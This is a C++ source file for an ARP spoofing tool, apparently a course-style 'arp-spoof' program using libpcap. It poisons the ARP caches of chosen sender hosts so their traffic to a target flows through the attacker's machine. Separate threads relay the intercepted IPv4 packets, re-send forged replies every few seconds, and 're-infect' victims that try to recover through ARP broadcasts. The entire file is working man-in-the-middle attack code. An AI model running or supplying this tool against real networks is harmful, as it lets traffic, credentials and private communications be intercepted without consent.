#include <cstdio>
#include <pcap.h>
#include <cstring>
#include <unistd.h>
#include <net/if.h>
#include <ctime>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <thread>
#include <vector>
#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct flow {
    Mac sm;  // sender mac
    Ip sip;  // sender ip
    Mac tm;  // target mac
    Ip tip;  // target ip
};

void usage() {
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: arp-spoof wlan0 192.168.0.10 192.168.0.1 192.168.0.11 192.168.0.1\n");
}

bool get_my_mac(const char* iface, Mac& mac) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return false;
    }

    mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
    close(sock);
    return true;
}

bool get_my_ip(const char* iface, Ip& ip) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;

    struct ifreq ifr;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(sock, SIOCGIFADDR, &ifr) != 0) {
        close(sock);
        return false;
    }

    ip = Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
    close(sock);
    return true;
}

void arp_request(pcap_t* pcap, Mac my_mac, Ip my_ip, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(my_ip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(target_ip);

    for (int i = 0; i < 3; i++) {
        pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        sleep(1);
    }
}

Mac arp_reply(pcap_t* pcap, Ip target_ip) {
    time_t start = time(nullptr);
    while (time(nullptr) - start < 5) {
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res < 0) break;

        EthHdr* eth_hdr = (EthHdr*)packet;
        if (ntohs(eth_hdr->type_) != EthHdr::Arp) continue;

        const EthArpPacket* arp_packet = reinterpret_cast<const EthArpPacket*>(packet);
        if (ntohs(arp_packet->arp_.op_) != ArpHdr::Reply) continue;
        if (ntohl(arp_packet->arp_.sip_) != target_ip) continue;

        return arp_packet->arp_.smac_;
    }
    return Mac::nullMac();
}

void arp_spoof(pcap_t* pcap, Mac my_mac, Ip spoof_ip, Mac target_mac, Ip target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = target_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(spoof_ip);
    packet.arp_.tmac_ = target_mac;
    packet.arp_.tip_ = htonl(target_ip);

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
}

void relay_loop(pcap_t* pcap, const std::vector<flow>& flows, const Mac& my_mac) {
    std::thread([=]() {
        while (true) {
            struct pcap_pkthdr* header;
            const u_char* packet;

            int res = pcap_next_ex(pcap, &header, &packet);
            if (res <= 0) continue;

            const EthHdr* eth_hdr = reinterpret_cast<const EthHdr*>(packet);
            if (ntohs(eth_hdr->type_) != EthHdr::Ip4) continue;

            for (const auto& f : flows) {
                if (eth_hdr->smac_ == f.sm && eth_hdr->dmac_ == my_mac) {
                    std::vector<u_char> relay_pkt(header->caplen);
                    memcpy(relay_pkt.data(), packet, header->caplen);

                    EthHdr* relay_eth = reinterpret_cast<EthHdr*>(relay_pkt.data());
                    relay_eth->smac_ = my_mac;
                    relay_eth->dmac_ = f.tm;

                    int send_res = pcap_sendpacket(pcap, relay_pkt.data(), header->caplen);
                    if (send_res == 0) {
                        printf("[RELAY] Relayed IP packet: %s -> %s\n",
                               std::string(f.sip).c_str(), std::string(f.tip).c_str());
                    }
                }
            }
        }
    }).detach();
}

void periodic_spoof(pcap_t* pcap, const std::vector<flow>& flows, Mac my_mac) {
    std::thread([=]() {
        while (true) {
            for (const auto& f : flows) {
                arp_spoof(pcap, my_mac, f.tip, f.sm, f.sip);
                printf("[SPOOF] Sent ARP reply to %s claiming %s\n",
                       std::string(f.sip).c_str(), std::string(f.tip).c_str());
            }
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }).detach();
}

void monitor_and_infect(pcap_t* pcap, const std::vector<flow>& flows, const Mac& my_mac) {
    std::thread([=]() {
        struct pcap_pkthdr* header;
        const u_char* packet;

        while (true) {
            int res = pcap_next_ex(pcap, &header, &packet);
            if (res <= 0) continue;

            const EthHdr* eth_hdr = reinterpret_cast<const EthHdr*>(packet);
            if (ntohs(eth_hdr->type_) != EthHdr::Arp) continue;

            const EthArpPacket* arp = reinterpret_cast<const EthArpPacket*>(packet);
            if (ntohs(arp->arp_.op_) != ArpHdr::Request) continue;

            for (const flow& f : flows) {
                if (eth_hdr->smac_ == f.sm && eth_hdr->dmac_ == Mac::broadcastMac()) {
                    printf("[MONITOR] Sender %s is recovering via broadcast → Re-infecting\n",
                           std::string(f.sip).c_str());

                    arp_spoof(pcap, my_mac, f.tip, f.sm, f.sip);
                }
            }
        }
    }).detach();
}



int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    const char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (!pcap) {
        fprintf(stderr, "pcap_open_live(%s) failed: %s\n", dev, errbuf);
        return -1;
    }

    Mac my_mac;
    Ip my_ip;
    if (!get_my_mac(dev, my_mac)) {
        printf("Failed to get my MAC\n");
        return -1;
    }
    if (!get_my_ip(dev, my_ip)) {
        printf("Failed to get my IP\n");
        return -1;
    }

    printf("My MAC: %s\n", string(my_mac).c_str());
    printf("My IP : %s\n", string(my_ip).c_str());

    vector<flow> flows;

    for (int i = 2; i < argc; i += 2) {
        Ip sip = Ip(argv[i]);
        Ip tip = Ip(argv[i + 1]);

        arp_request(pcap, my_mac, my_ip, sip);
        Mac sm = arp_reply(pcap, sip);
        if (sm == Mac::nullMac()) {
            printf("Failed to get sender MAC for %s\n", string(sip).c_str());
            return -1;
        }

        arp_request(pcap, my_mac, my_ip, tip);
        Mac tm = arp_reply(pcap, tip);
        if (tm == Mac::nullMac()) {
            printf("Failed to get target MAC for %s\n", string(tip).c_str());
            return -1;
        }

        printf("Resolved flow: %s (%s) -> %s (%s)\n",
               string(sip).c_str(), string(sm).c_str(),
               string(tip).c_str(), string(tm).c_str());

        flows.push_back({sm, sip, tm, tip});
        arp_spoof(pcap, my_mac, tip, sm, sip);
    }

    relay_loop(pcap, flows, my_mac);
    periodic_spoof(pcap, flows, my_mac);
    monitor_and_infect(pcap, flows, my_mac);

    while (true) pause();  // keep main thread alive
    pcap_close(pcap);
    return 0;
}

